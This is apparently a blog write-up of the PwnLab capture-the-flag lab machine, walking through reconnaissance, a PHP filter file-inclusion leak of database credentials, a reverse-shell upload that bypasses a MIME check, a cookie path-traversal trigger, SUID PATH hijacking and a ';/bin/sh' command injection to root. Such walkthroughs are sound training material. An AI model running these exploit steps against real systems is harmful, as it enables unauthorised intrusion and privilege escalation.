---
layout: post
title: CTF PwnLab
date:   2022-03-05 21:07:56 -0600
categories: CTF
tags: Linux
---

# netdiscover
```sh
sudo netdiscover
```

![](https://i.imgur.com/cLIp58i.png)
192.168.0.29
# nmap
```sh
nmap -sV 192.168.0.29 -p- 
```

![](https://i.imgur.com/g3Enwl2.png)
80, 11, 3306, 33795
# port 80
## gobuster
```sh
gobuster dir -t 100 -u http://192.168.0.29/ -w ~/Documents/wordlist/directory-list-medium.txt

/upload               (Status: 301) [Size: 313] [--> http://192.168.0.29/upload/]
/images               (Status: 301) [Size: 313] [--> http://192.168.0.29/images/]
```
![](https://i.imgur.com/ldl7eWg.png)
# port 111
```sh
sudo nmap -sSUC -p111 192.168.0.29

PORT    STATE SERVICE
111/tcp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33795/tcp   status
|   100024  1          44347/udp6  status
|   100024  1          50459/tcp6  status
|_  100024  1          60795/udp   status
111/udp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33795/tcp   status
|   100024  1          44347/udp6  status
|   100024  1          50459/tcp6  status
|_  100024  1          60795/udp   status
```
Nothing interesting
# Mysql
I don't have the creds so I can try to exploit now.

# Port 80 LFI
https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/
![](https://i.imgur.com/h4ESarw.png)
It's not working for `/etc/passwd` but there is a file login and upload, I can try them.
```sh
curl http://192.168.0.29/\?page\=php://filter/read\=convert.base64-encode/resource\=login 
```
Output:
```html
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEFORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==</center>
</body>
</html>%   
```
I have to decode it, it's in base 64.
```php
<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
	$luser = $_POST['user'];
	$lpass = base64_encode($_POST['pass']);
...
```
We also have the file `config.php`.
```sh
curl http://192.168.0.29/\?page\=php://filter/read\=convert.base64-encode/resource\=config
```
Output:
```sh
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```
We have the creds for the mysql

# Mysql
## Browse the database
```sh
mysql -u root -h 192.168.0.29 -p 
H4u%QJ_H99
```
```mysql
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+

SHOW TABLES;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+

select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
```
## Decode the hash
We can decode them, with a base64 decoder.
```sh
echo "Sld6WHVCSkpOeQ==" | base64 --decode
JWzXuBJJNy
```
kent | JWzXuBJJNy 
mike | SIfdsTEn6I
kane | iSv5Ym2GRo

# Upload a revershell
![](https://i.imgur.com/vwxkbhN.png)
Let's upload a revershell.
![](https://i.imgur.com/ixYG5Li.png)
Ok let's upload an image  ( ͡° ͜ʖ ͡°).
```sh
cp phprc.php rc.jpg
```
![](https://i.imgur.com/y5PFccQ.png)
It's not working, let's see the code of upload.php.

```sh
curl http://192.168.0.29/\?page\=php://filter/read\=convert.base64-encode/resource\=upload

...
if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') { die('Error 002');
...
```

I have the error 002 because of the mime verification, I need to bypass it.
I have to add this code in my file.
```text
GIF89aP;
[shell]
```
![](https://i.imgur.com/KhDZUsz.png)
After the upload I change the cookie, it was hard to find this solution.
![](https://i.imgur.com/NIg4tV8.png)
I send the request an now i have a shell.
```curl
GET / HTTP/1.1
Host: 192.168.0.29
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.29/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: lang=../upload/29e8ea4a462331c5af3754eb8dbd4328.gif
Connection: close

```
![](https://i.imgur.com/OJkXJ2r.png)

# Connect as kane
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
su kane
iSv5Ym2GRo
```
![](https://i.imgur.com/4hlwk4f.png)
In the home directory we have the file `msgmike` it's an executable.

```sh
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
```
![](https://materials.rangeforce.com/img/suidbit/Wxdy0zn.png)
So it will run as mike.
let's see what is inside:
```sh
strings ms*

/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setregid
setreuid
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh 
QVh[
[^_]
cat /home/mike/msg.txt
;*2$"(
GCC: (Debian 4.9.2-10) 4.9.2
GCC: (Debian 4.8.4-1) 4.8.4
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id

...
```
As we can see it's using the command cat.
google: `exploit binaries privesc suid`.
https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/
![](https://i.imgur.com/A7jOMRI.png)
We are using cat and not whoami.
```sh
echo "/bin/bash" > /tmp/cat 
chmod 777 /tmp/cat  
export PATH=/tmp:$PATH
./msgmike
id
```
Output:
```sh
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
```
![](https://i.imgur.com/Nl3iRy3.png)
Now let's see what is in the home director.
We have a similar programe called `msg2root`.
```sh
strings msg2root
```
![](https://i.imgur.com/AxpfXjH.png)
```sh
/bin/echo %s >> /root/messages.txt
```
The `%s` is like the `$1` in bash, he need an argument.
I will execute 2 cammmands, the first one is echo, the second one is /bin/sh.
```text
A; B # Run A and then B, regardless of success of A 
A && B # Run B if and only if A succeeded 
A || B # Run B if and only if A failed 
A & # Run A in background.
```
I'm gonna use ; to execute the 2 commands.
```sh
./msg2root 
sdf;/bin/sh
id
```
Output:
```sh
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
```

I'm gonna display the flag.
Cat is broken si I'm gonna use tail.
```sh
tail /root/*
```
Output:
```sh
==> /root/flag.txt <==
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'

==> /root/messages.txt <==
```













































































